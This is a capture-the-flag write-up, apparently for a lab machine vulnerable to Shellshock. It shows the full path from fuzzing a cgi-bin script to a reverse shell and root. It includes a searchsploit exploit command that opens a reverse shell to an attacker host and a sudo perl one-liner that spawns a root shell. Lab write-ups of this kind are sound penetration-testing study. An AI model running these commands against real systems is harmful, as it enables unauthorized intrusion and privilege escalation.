
- We are given an IP address and we will use `nmap` to enumerate the ports
![[Pasted image 20250827105257.png]]
- We have 2 ports open, one being the `80` port which means we have a web application

- When I open the the web app, I am met with a text and an image and nothing else:))
![[Pasted image 20250827105828.png]]

- Next step is to start web fuzzing with `ffuf`
- I use a common directory list and I got no result
- Then I move to a more complex and diverse list `/usr/share/seclists/Discovery/Web-Content/combined_directories.txt`
```shell
ffuf -u http://10.10.10.56/FUZZ -w /usr/share/seclists/Discovery/Web-Content/combined_directories.txt  -ic -t 150
```
- We got somethin very very interesting, the directory `/cgi-bin/`
![[Pasted image 20250827110727.png]]

- From a search on google I learned that the `/cgi-bin` directory contains scripts that can be executed on the web app
- I start to fuzz for scripts with different extensions: `.sh`, `.php`, `.py`, `.pl`

- I got one hit that being the `user.sh` script
![[Pasted image 20250827111919.png]]

- The `user.sh` contains the output of the `uptime` Linux command 
![[Pasted image 20250827112006.png]]

- Searching on web for exploits for `cgi-bin` I found the famous `Shellshock` exploit, i.e. the [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271) 
- I also found an exploit using `searchsploit`
```shell
searchsploit shellshock apache cgi
```
![[Pasted image 20250827112631.png]]

- I download it using `searchsploit -m linux/remote/34900.py`
- The exploit works with `python2` and we also have to specify some options
```shell
python2 34900.py payload=reverse rhost=10.10.10.56 rport=80 lhost=10.10.14.8 lport=4444 pages=/cgi-bin/user.sh 
```

- After running the script I got a reverse shell as the user `shelly` and also got the user flag from `user.txt`
![[Pasted image 20250827113520.png]]

## Root flag

- First thing I try is `sudo -l` to see if I got any permission to run any script as another user
![[Pasted image 20250827113701.png]]
- We got a very good information, that we can run `perl` with `sudo` so that means we can run `perl` scripts as the `root` user

- I search on the for a quick script to get `root` permissions and I found one in [gtfobins-perl](https://gtfobins.github.io/gtfobins/perl/), which will give me a bash session as the `root` user and I can get the `root` flag from `root.txt`
```shell
perl -e 'exec "/bin/sh";'
```
![[Pasted image 20250827114228.png]]

